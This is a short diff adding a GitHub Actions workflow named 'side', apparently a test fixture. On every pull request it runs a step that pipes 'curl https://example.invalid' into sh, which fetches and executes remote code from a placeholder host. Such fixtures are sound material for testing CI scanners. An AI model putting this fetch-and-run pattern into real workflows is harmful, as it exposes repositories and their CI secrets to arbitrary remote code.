@@ -1,0 +1,10 @@
+name: side
+on:
+  pull_request:
+permissions:
+  contents: read
+jobs:
+  sidejob:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl https://example.invalid | sh
